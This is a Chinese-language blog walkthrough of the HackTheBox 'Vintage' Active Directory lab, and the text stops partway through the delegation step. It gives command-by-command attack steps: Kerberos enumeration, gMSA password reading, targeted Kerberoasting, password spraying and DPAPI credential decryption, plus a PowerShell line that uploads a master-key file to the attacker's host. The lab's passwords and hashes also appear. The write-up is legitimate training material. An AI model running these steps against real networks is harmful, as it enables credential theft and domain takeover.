@@ -1,0 +1,433 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>HTB-Vintage | DDL'S BLOG</title><meta name="author" content="DDL"><meta name="copyright" content="DDL"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="HTB-Vintage这个room讲的是一个DPAPI的凭证泄露+基于资源的约束委派+readgMSAPasswrod造成的密码泄露+ 是个windows电脑，提前给了账户  P.Rosa &#x2F; Rosaisbest123  然后扫描一遍，判断是个域控 smb连接进行一下尝试  smbclient -U ‘vintage.htb&#x2F;P.Rosa%Rosaisbest123’ -L">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB-Vintage">
+<meta property="og:url" content="http://example.com/2025/05/07/HTB-Vintage/index.html">
+<meta property="og:site_name" content="DDL&#39;S BLOG">
+<meta property="og:description" content="HTB-Vintage这个room讲的是一个DPAPI的凭证泄露+基于资源的约束委派+readgMSAPasswrod造成的密码泄露+ 是个windows电脑，提前给了账户  P.Rosa &#x2F; Rosaisbest123  然后扫描一遍，判断是个域控 smb连接进行一下尝试  smbclient -U ‘vintage.htb&#x2F;P.Rosa%Rosaisbest123’ -L">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/img/avatar.png">
+<meta property="article:published_time" content="2025-05-07T11:11:00.000Z">
+<meta property="article:modified_time" content="2025-05-07T11:25:58.436Z">
+<meta property="article:author" content="DDL">
+<meta property="article:tag" content="HTB">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/avatar.png"><link rel="shortcut icon" href="/img/avatar.png"><link rel="canonical" href="http://example.com/2025/05/07/HTB-Vintage/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Failed',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'HTB-Vintage',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  isShuoshuo: false
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">25</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">7</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">3</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> blog</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> categories</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> tags</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> crchives</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> link</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> message</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> about</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">DDL'S BLOG</span></a><a class="nav-page-title" href="/"><span class="site-name">HTB-Vintage</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> blog</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> categories</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> tags</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> crchives</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> link</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> message</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> about</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">HTB-Vintage</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2025-05-07T11:11:00.000Z" title="Created 2025-05-07 19:11:00">2025-05-07</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2025-05-07T11:25:58.436Z" title="Updated 2025-05-07 19:25:58">2025-05-07</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/penetration/">penetration</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word Count:</span><span class="word-count">1.9k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">Reading Time:</span><span>9mins</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="HTB-Vintage"><a href="#HTB-Vintage" class="headerlink" title="HTB-Vintage"></a>HTB-Vintage</h1><p>这个room讲的是一个DPAPI的凭证泄露+基于资源的约束委派+readgMSAPasswrod造成的密码泄露+</p>
+<p>是个windows电脑，提前给了账户</p>
+<ul>
+<li>P.Rosa &#x2F; Rosaisbest123</li>
+</ul>
+<p>然后扫描一遍，判断是个域控</p>
+<p>smb连接进行一下尝试</p>
+<ul>
+<li>smbclient -U ‘vintage.htb&#x2F;P.Rosa%Rosaisbest123’ -L &#x2F;&#x2F;DC01.vintage.htb<ul>
+<li>报错，session setup failed: NT_STATUS_NOT_SUPPORTED</li>
+<li>然后查看一下日志↓</li>
+</ul>
+</li>
+<li>smbclient -U ‘vintage.htb&#x2F;P.Rosa%Rosaisbest123’ -L &#x2F;&#x2F;DC01.vintage.htb –debug-stdout -d 10<ul>
+<li>是刚开始Kerberos验证没通过，ntlm验证应该是不支持</li>
+</ul>
+</li>
+</ul>
+<p>用nxc指定-k Kerberos验证可以</p>
+<ul>
+<li>nxc smb DC01.vintage.htb -d vintage.htb -u ‘P.Rosa’ -p ‘Rosaisbest123’ -k </li>
+<li>nxc smb DC01.vintage.htb -d vintage.htb -u ‘P.Rosa’ -p ‘Rosaisbest123’ -k –shares</li>
+</ul>
+<h2 id="用kali模拟域用户"><a href="#用kali模拟域用户" class="headerlink" title="用kali模拟域用户"></a>用kali模拟域用户</h2><p>参考</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://notes.benheater.com/books/active-directory/page/kerberos-authentication-from-kali?ref=benheater.com">https://notes.benheater.com/books/active-directory/page/kerberos-authentication-from-kali?ref=benheater.com</a></li>
+</ul>
+<p>下载</p>
+<ul>
+<li>apt install -y heimdal-clients libsasl2-modules-gssapi-heimdal</li>
+<li>vim .&#x2F;custom_krb5.conf</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[libdefaults]</span><br><span class="line">    default_realm = VINTAGE.HTB</span><br><span class="line">    dns_lookup_realm = <span class="literal">true</span></span><br><span class="line">    dns_lookup_kdc = <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">[realms]</span><br><span class="line">    VINTAGE.HTB = &#123;</span><br><span class="line">        kdc = dc01.vintage.htb</span><br><span class="line">        admin_server = dc01.vintage.htb</span><br><span class="line">        default_domain = dc01.vintage.htb</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">[domain_realm]</span><br><span class="line">    vintage.htb = VINTAGE.HTB</span><br><span class="line">    .vintage.htb = VINTAGE.HTB</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>export KRB5_CONFIG&#x3D;”$PWD&#x2F;custom_krb5.conf”</li>
+<li>kinit P.Rosa</li>
+<li>klist</li>
+<li>export KRB5CCNAME&#x3D;&#x2F;tmp&#x2F;krb5cc_0</li>
+</ul>
+<p><img src="https://github.com/DDL08/images/blob/img/img/image-20250507093843886.png?raw=true" alt="image-20250507093843886"></p>
+<p>然后开始信息收集</p>
+<ul>
+<li>ldapsearch -Q -Y GSSAPI -H ldap:&#x2F;&#x2F;dc01.vintage.htb -b ‘DC&#x3D;VINTAGE,DC&#x3D;HTB’ ‘(objectClass&#x3D;user)’ | grep -i samaccountname<ul>
+<li>列举用户</li>
+</ul>
+</li>
+<li>ldapsearch -Q -Y GSSAPI -H ldap:&#x2F;&#x2F;dc01.vintage.htb -b ‘DC&#x3D;VINTAGE,DC&#x3D;HTB’ ‘(objectClass&#x3D;computer)’ | grep -i samaccountname<ul>
+<li>列举计算机</li>
+</ul>
+</li>
+<li>ldapsearch -Q -Y GSSAPI -H ldap:&#x2F;&#x2F;dc01.vintage.htb -b ‘DC&#x3D;VINTAGE,DC&#x3D;HTB’ ‘(objectClass&#x3D;group)’ | grep -i samaccountname<ul>
+<li>在 <code>dc01.vintage.htb</code> 域控制器上查询所有组，并从查询结果中提取包含 <code>samaccountname</code> 字段的信息</li>
+</ul>
+</li>
+<li>vim groups.txt<ul>
+<li>然后把上遍的组写进去</li>
+</ul>
+</li>
+<li>while read group ; do echo -e “${group}\n” ; ldapsearch -Q -Y GSSAPI -H ldap:&#x2F;&#x2F;dc01.vintage.htb -b ‘DC&#x3D;VINTAGE,DC&#x3D;HTB’ “(sAMAccountName&#x3D;${group})” | grep ‘member: ‘ ; echo ‘’ ; done &lt; groups.txt<ul>
+<li>读取每个组来获取组成员</li>
+</ul>
+</li>
+<li>nxc ldap DC01.vintage.htb -d ‘vintage.htb’ -u ‘P.Rosa’ -p ‘Rosaisbest123’ -k -M get-network -o ALL&#x3D;true<ul>
+<li>获取dns记录</li>
+</ul>
+</li>
+<li>nxc smb DC01.vintage.htb -d vintage.htb -u ‘P.Rosa’ -p ‘Rosaisbest123’ -k –pass-pol<ul>
+<li>密码组策略</li>
+</ul>
+</li>
+</ul>
+<h3 id="PRE-WINDOWS-2000-COMPATIBLE-ACCESS"><a href="#PRE-WINDOWS-2000-COMPATIBLE-ACCESS" class="headerlink" title="PRE-WINDOWS 2000 COMPATIBLE ACCESS"></a>PRE-WINDOWS 2000 COMPATIBLE ACCESS</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">如果一个计算机账户在 PRE-WINDOWS 2000 COMPATIBLE ACCESS 组中，这意味着计算机凭证通常是 DOMAIN.TLD\COMPUTER_NAME$:computer_name ，所以密码是计算机名的的小写形式。</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="获取第二个票据"><a href="#获取第二个票据" class="headerlink" title="获取第二个票据"></a>获取第二个票据</h2><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><ul>
+<li><p>pipx install git+<a target="_blank" rel="noopener" href="https://github.com/garrettfoster13/pre2k">https://github.com/garrettfoster13/pre2k</a></p>
+<ul>
+<li><em>这个工具自动发现具有</em> <code>PRE-WINDOWS 2000</code> <em>凭证的计算机</em></li>
+</ul>
+</li>
+<li><p>pre2k unauth -d ‘vintage.htb’ -dc-ip ‘10.10.11.45’ -inputfile computers.txt -save</p>
+<ul>
+<li>环境放在myenv了,他会导出一个tgt</li>
+</ul>
+</li>
+</ul>
+<p>我们现在有一个有效的 TGT 用于* <code>FS01$</code> <em>计算机账户</em></p>
+<h2 id="获取第三个票据"><a href="#获取第三个票据" class="headerlink" title="获取第三个票据"></a>获取第三个票据</h2><h3 id="readgmsapasswrod权限"><a href="#readgmsapasswrod权限" class="headerlink" title="readgmsapasswrod权限"></a>readgmsapasswrod权限</h3><p>获取</p>
+<p>在analyse的shortest paths上可以看到，这个domain computers有readgmsapasswrod权限</p>
+<p><img src="https://github.com/DDL08/images/blob/img/img/image-20250507165742564.png?raw=true" alt="image-20250507165742564"></p>
+<p>然后通过这个权限获取gMSA01的票据</p>
+<ul>
+<li><p>apt install -y bloodyad </p>
+</li>
+<li><p>KRB5CCNAME&#x3D;’FS01$.ccache’ bloodyAD –host DC01.vintage.htb -k -d vintage.htb get object ‘GMSA01$’ –attr msDS-ManagedPassword</p>
+</li>
+<li><p>impacket-getTGT -dc-ip 10.10.11.45 -hashes :0ae29a5cdfa7d5b72464dc92ffeaa8d1 ‘vintage.htb&#x2F;gMSA01$‘@DC01.vintage.htb</p>
+<ul>
+<li>生成票据</li>
+</ul>
+</li>
+<li><p>mv ‘gMSA01$@DC01.vintage.htb.ccache’ gMSA01.ccache</p>
+</li>
+<li><p>chmod 600 gMSA01.ccache</p>
+<ul>
+<li><code>klist</code> <em>和其他 Heimdal 二进制程序不会读取权限过于开放的票证</em></li>
+</ul>
+</li>
+</ul>
+<p><img src="https://github.com/DDL08/images/blob/img/img/image-20250507113016437.png?raw=true" alt="image-20250507113016437"></p>
+<h2 id="flag1-获取第4个票据"><a href="#flag1-获取第4个票据" class="headerlink" title="flag1+获取第4个票据"></a>flag1+获取第4个票据</h2><p>SERVICEMANAGERS组用户</p>
+<p><img src="https://github.com/DDL08/images/blob/img/img/image-20250507170246278.png?raw=true" alt="image-20250507170246278"></p>
+<p>获取一下源码targetedKerberoast.py</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">91         if TGT is None:</span><br><span class="line">592             if TGS is None:</span><br><span class="line">593                 tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(clientName=userName, password=args.auth_password, domain=args.auth_domain, lmhash=None, nthash=auth_nt_hash,</span><br><span class="line">594                                                                         aesKey=args.auth_aes_key, kdcHost=args.dc_ip)</span><br><span class="line">595         else:</span><br><span class="line">596             tgt = TGT[&#x27;KDC_REP&#x27;]</span><br><span class="line">597             cipher = TGT[&#x27;cipher&#x27;]</span><br><span class="line">598             sessionKey = TGT[&#x27;sessionKey&#x27;]</span><br><span class="line">599</span><br><span class="line">600         TGT = &#123;&#125;</span><br><span class="line">601         TGT[&#x27;KDC_REP&#x27;] = tgt</span><br><span class="line">602         TGT[&#x27;cipher&#x27;] = cipher</span><br><span class="line">603         TGT[&#x27;sessionKey&#x27;] = sessionKey</span><br><span class="line"></span><br><span class="line">改成</span><br><span class="line"></span><br><span class="line">591         if TGT is None:</span><br><span class="line">592             if TGS is None:</span><br><span class="line">593                 tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(clientName=userName, password=args.auth_password, domain=args.auth_domain, lmhash=None, nthash=auth_nt_hash,</span><br><span class="line">594                                                                         aesKey=args.auth_aes_key, kdcHost=args.dc_ip)</span><br><span class="line">595         </span><br><span class="line">596                 TGT = &#123;&#125;</span><br><span class="line">597                 TGT[&#x27;KDC_REP&#x27;] = tgt</span><br><span class="line">598                 TGT[&#x27;cipher&#x27;] = cipher</span><br><span class="line">599                 TGT[&#x27;sessionKey&#x27;] = sessionKey</span><br><span class="line">600             </span><br><span class="line">601         else:</span><br><span class="line">602             tgt = TGT[&#x27;KDC_REP&#x27;]</span><br><span class="line">603             cipher = TGT[&#x27;cipher&#x27;]</span><br><span class="line">604             sessionKey = TGT[&#x27;sessionKey&#x27;]</span><br></pre></td></tr></table></figure>
+
+
+
+<ul>
+<li>KRB5CCNAME&#x3D;gMSA01.ccache python3 targetedKerberoast&#x2F;targetedKerberoast.py -k –no-pass -d vintage.htb –dc-host DC01.vintage.htb –dc-ip 10.10.11.45 <ul>
+<li>查看hash</li>
+</ul>
+</li>
+<li>KRB5CCNAME&#x3D;gMSA01.ccache ldapsearch -Q -Y GSSAPI -H ldap:&#x2F;&#x2F;dc01.vintage.htb -b “OU&#x3D;Pre-Migration,DC&#x3D;vintage,DC&#x3D;htb” “(CN&#x3D;svc_ldap)” userAccountControl<ul>
+<li>查看其他账户的uac</li>
+</ul>
+</li>
+<li>卡太久就重新生成一个票据</li>
+<li>但是没出sql的hash<ul>
+<li>↓因为在node那也能看到区别，有个enable-false，未启用的账户</li>
+<li><em>使用与其它</em> <code>sql_</code> <em>账户相同的 UAC 值启用</em> <code>sql_svc</code></li>
+</ul>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">KRB5CCNAME=gMSA01.ccache ldapmodify -Q -Y GSSAPI -H ldap://dc01.vintage.htb &lt;&lt; EOF</span><br><span class="line">dn: CN=svc_sql,OU=Pre-Migration,DC=vintage,DC=htb</span><br><span class="line">changetype: modify</span><br><span class="line">replace: userAccountControl</span><br><span class="line">userAccountControl: 66048</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure>
+
+<p>获取hash之后john一下，</p>
+<p>然后可以发现有个密码重用()</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nxc ldap DC01.vintage.htb -d &#x27;vintage.htb&#x27; -u ad_users.txt -p &#x27;Zer0the0ne&#x27; --continue-on-success -k</span><br></pre></td></tr></table></figure>
+
+<p>然后就登录，凭证换一下</p>
+<ul>
+<li>export KRB5_CONFIG&#x3D;”$PWD&#x2F;custom_krb5.conf”</li>
+<li>kinit C.Neri<ul>
+<li>Zer0the0ne</li>
+</ul>
+</li>
+<li>klist</li>
+<li>export KRB5CCNAME&#x3D;&#x2F;tmp&#x2F;krb5cc_0 </li>
+<li>evil-winrm -i DC01.vintage.htb -r vintage.htb  -u ‘C.Neri’</li>
+</ul>
+<p>获得flag1+C.NERI账户</p>
+<h2 id="DPAPI-获取第5个票据"><a href="#DPAPI-获取第5个票据" class="headerlink" title="DPAPI+获取第5个票据"></a>DPAPI+获取第5个票据</h2><h3 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h3><p>用户可能在以 <code>C.Neri_adm</code> 身份登录时执行了一些管理任务，因此在该机器上可能会有一些缓存的凭证</p>
+<h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><p>应用程序调用 <code>CryptProtectData()</code> 来加密某些内容时：</p>
+<p>1&#x2F;DPAPI 为该项目生成一个随机密钥，称为会话密钥。会话密钥用于加密数据（密码等）。</p>
+<p>2&#x2F; 该会话密钥随后使用用户的密钥加密。密钥是从用户的登录凭证或计算机账户的随机密码派生的。</p>
+<p>3&#x2F; 最终输出包含加密的数据和加密的会话密钥。</p>
+<h3 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h3><p>传文件参考</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://notes.benheater.com/books/file-transfers-and-data-exfiltration/page/http">https://notes.benheater.com/books/file-transfers-and-data-exfiltration/page/http</a></li>
+</ul>
+<p>内容参考</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://notes.benheater.com/books/active-directory/page/dumping-passwords-from-windows-credential-manager?ref=benheater.com">https://notes.benheater.com/books/active-directory/page/dumping-passwords-from-windows-credential-manager?ref=benheater.com</a></li>
+</ul>
+<p>列出转储凭证</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ls -r -h ~\AppData\Local\Microsoft\Credentials\ | select -expand fullname</span><br><span class="line"></span><br><span class="line">ls -r -h ~\AppData\Roaming\Microsoft\Credentials\ | select -expand fullname</span><br></pre></td></tr></table></figure>
+
+<p>列出转储的密钥</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -r -h ~\AppData\Roaming\Microsoft\Protect\ | select -expand fullname</span><br></pre></td></tr></table></figure>
+
+<p>然后传文件这4个文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[void](New-Object System.Net.WebClient).UploadFile(&#x27;http://10.10.16.7/&#x27;, &quot;C:\Users\C.Neri\AppData\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115\99cf41a3-a552-4cf7-a8d7-aca2d6f7339b&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>或者</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[Convert]::ToBase64String([IO.File]::ReadAllBytes(&quot;C:\users\c.neri\appdata\roaming\microsoft\credentials\C4BB96844A5C9DD45D5B6A9859252BA6&quot;))</span><br><span class="line"></span><br><span class="line">echo &quot;==&quot; | base64 -d &gt; C4BB96844A5C9DD45D5B6A9859252BA6</span><br></pre></td></tr></table></figure>
+
+<p>解密一下，获得转储密钥的key</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-dpapi masterkey -file 99cf41a3-a552-4cf7-a8d7-aca2d6f7339b -sid S-1-5-21-4024337825-2033394866-2055507597-1115 -password &#x27;Zer0the0ne&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>然后利用转储密钥的key去解密转储凭证</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-dpapi credential -file C4BB96844A5C9DD45D5B6A9859252BA6 -key 0xf8901b2125dd10209da9f66562df2e68e89a48cd0278b48a37f510df01418e68b283c61707f3935662443d81c0d352f1bc8055523bf65b2d763191ecd44e525a</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>在这里我传输过程中文件有损坏，换成base64就行</li>
+<li>Uncr4ck4bl3P4ssW0rd0312</li>
+</ul>
+<p>现在是获取到了 <strong>C.NERI_ADM</strong> 账户的密码</p>
+<p><img src="https://github.com/DDL08/images/blob/img/img/image-20250507164837996.png?raw=true" alt="image-20250507164837996"></p>
+<h2 id="基于资源的约束委派"><a href="#基于资源的约束委派" class="headerlink" title="基于资源的约束委派"></a>基于资源的约束委派</h2><p><img src="https://github.com/DDL08/images/blob/img/img/image-20250507171954539.png?raw=true" alt="image-20250507171954539"></p>
+<p><img src="https://github.com/DDL08/images/blob/img/img/image-20250507172155826.png?raw=true" alt="image-20250507172155826"></p>
+<ul>
+<li><p>设置委派对象属性（如 <code>msDS-AllowedToDelegateTo</code>）之后，<strong>生效时间通常也是 0～15 分钟</strong>。</p>
+</li>
+<li><p>设置spn账户，单域是30秒以内，多域0-15分钟</p>
+</li>
+<li><p>unset KRB5CCNAME</p>
+</li>
+<li><p>kdestroy</p>
+</li>
+<li><p>export KRB5_CONFIG&#x3D;”$PWD&#x2F;custom_krb5.conf”</p>
+</li>
+<li><p>kinit C.Neri_adm</p>
+</li>
+<li><p>klist</p>
+</li>
+<li><p>export KRB5CCNAME&#x3D;&#x2F;tmp&#x2F;krb5cc_0</p>
+</li>
+</ul>
+<p>先生成俩要用的票据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">impacket-getTGT -dc-ip 10.129.119.165 &#x27;vintage.htb/C.Neri@DC01.vintage.htb&#x27;</span><br><span class="line"></span><br><span class="line">impacket-getTGT -dc-ip 10.129.119.165 &#x27;vintage.htb/C.Neri_adm@DC01.vintage.htb</span><br></pre></td></tr></table></figure>
+
+<p>改svc_ldap的密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">KRB5CCNAME=C.Neri@DC01.vintage.htb.ccache net rpc user password svc_ldap --use-kerberos=required -S DC01.vintage.htb</span><br></pre></td></tr></table></figure>
+
+<p>加到约束委派的组里</p>
+<ul>
+<li>bloodyAD –host dc01.vintage.htb -d ‘vintage.htb’ -k  add groupMember “DELEGATEDADMINS” “svc_sql”</li>
+</ul>
+<p>创建spn</p>
